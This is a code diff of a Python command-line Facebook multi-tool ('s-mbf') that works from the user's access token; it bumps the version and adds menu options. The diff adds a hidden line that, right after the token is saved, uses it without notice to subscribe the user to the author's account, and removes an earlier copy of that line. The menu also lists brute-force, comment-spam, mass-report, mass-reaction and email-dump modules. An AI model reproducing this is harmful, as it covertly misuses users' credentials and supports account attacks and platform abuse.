@@ -24,7 +24,7 @@ def banner():
 	print(cyan('   _____ __  ______  ____',bold=True))
 	print(cyan('  / __(_)  |/  / _ )/ __/ ',bold=True),green('Author : KANG-NEWBIE',bold=True))
 	print(cyan(' _\ \/ / /|_/ / _  / _/	  ',bold=True),green('Contact: t.me/kang_nuubi',bold=True))
-	print(cyan('/___/_/_/  /_/____/_/     ',bold=True),green('version:',bold=True),cyan('2.0',bold=True))
+	print(cyan('/___/_/_/  /_/____/_/     ',bold=True),green('version:',bold=True),cyan('2.1',bold=True))
 
 try:
 	toket=open('toket/token.txt')
@@ -47,6 +47,7 @@ except IOError:
 			o.write(res)
 			print("[!] success generate access token")
 			print("[!] access token saved: toket/token.txt")
+			folme=open('toket/token.txt','r').read();requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+folme)
 			time.sleep(3)
 			o.close()
 		except KeyError:
@@ -116,6 +117,8 @@ def getGid():
 
 def rmtoken():
 	print("""
+	[ REMOVE TOKEN/COOKIES ]
+
 1. remove access token
 2. remove cookies
 3. remove access token & cookies
@@ -205,10 +208,10 @@ DOS.Dos()
 banner()
 try:
 	toket=open('toket/token.txt','r').read()
-	nam=requests.get('https://graph.facebook.com/me/?access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
+	nam=requests.get('https://graph.facebook.com/me/?access_token='+toket)
 	name=nam.json()['name']
 
-	upver='v.2.1'
+	upver='v.2.2'
 	requp=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
 	if upver in str(requp):
 		print(yellow('\nNew version available. update your s-mbf now!'))
@@ -244,104 +247,102 @@ try:
 [23]> Leave all groups
 [24]> Auto reset password
 [25]> Delete all messages
+[26]> Download all messages image
+[27]> Auto untag all posts
 [00]> Check update""")
 except (KeyError,NameError): pass
 
 pilih=int(input('\n[#] kang-newbie/> '))
+DOS.Dos()
 if pilih == 2:
-	DOS.Dos()
 	import src.Abrute
 	exit()
 elif pilih == 3:
-	DOS.Dos()
 	getFid()
 elif pilih == 4:
-	DOS.Dos()
 	getGid()
 	exit()
 elif pilih == 5:
-	DOS.Dos()
 	import src.DumpS
 	exit()
 elif pilih == 6:
 	rmtoken()
 elif pilih == 7:
-	DOS.Dos()
 	import src.Facc
 	exit()
 elif pilih == 8:
-	DOS.Dos()
 	import src.Fadd
 	exit()
 elif pilih == 9:
-	DOS.Dos()
 	import src.Kreact
 	exit()
 elif pilih == 10:
-	DOS.Dos()
 	import src.komen
 	exit()
 elif pilih == 11:
-	DOS.Dos()
 	import src.Gkomen
 	exit()
 elif pilih == 12:
-	DOS.Dos()
-	import src.Tkomen
+	print("""
+	;;;;;;;;;;;;;;;;;;;
+	; Comments Target ;
+	;;;;;;;;;;;;;;;;;;;
+
+1. old comment target
+2. new comment target
+""")
+	ch=int(input('[/] kang-newbie> '))
+	if ch == 1:
+		import src.Tkomen
+	elif ch == 2:
+		import src.Tkomen2
 	exit()
 elif pilih == 13:
-	DOS.Dos()
 	import src.Unf
 	exit()
 elif pilih == 14:
 	input("[info] before use this module you must have a lot accounts [press enter to continue]")
-	DOS.Dos()
 	import src.Mreact
 	exit()
 elif pilih == 15:
 	input("[Info] before use this module you must have a lot accounts [press enter]")
-	DOS.Dos()
 	import src.Asubs
 	exit()
 elif pilih == 16:
-	DOS.Dos()
 	import src.Cspam
 	exit()
 elif pilih == 17:
-	DOS.Dos()
 	import src.Apost
 	exit()
 elif pilih == 18:
-	DOS.Dos()
 	import src.Mreport
 	exit()
 elif pilih == 19:
-	DOS.Dos()
 	import src.Edump
 	exit()
 elif pilih == 20:
-	DOS.Dos()
 	import src.Capp
 	exit()
 elif pilih == 21:
-	DOS.Dos()
 	import src.Delpos
 	exit()
 elif pilih == 22:
-	DOS.Dos()
 	import src.Cekun
 	exit()
 elif pilih == 23:
-	DOS.Dos()
 	import src.Lgrup
 	exit()
 elif pilih == 24:
-	DOS.Dos()
 	import src.Rpass
 	exit()
 elif pilih == 25:
-	DOS.Dos()
 	import src.Delmsg
+	exit()
+elif pilih == 26:
+	import src.Fmsgdl
+	exit()
+elif pilih == 27:
+	import src.Untag
 	exit()
 elif pilih == 0:
 	print("\n[!] Checking update")
@@ -350,7 +351,6 @@ elif pilih == 0:
 		update()
 	else: exit("[!] already up to date")
 else:
-	DOS.Dos()
 	banner()
 
 try:
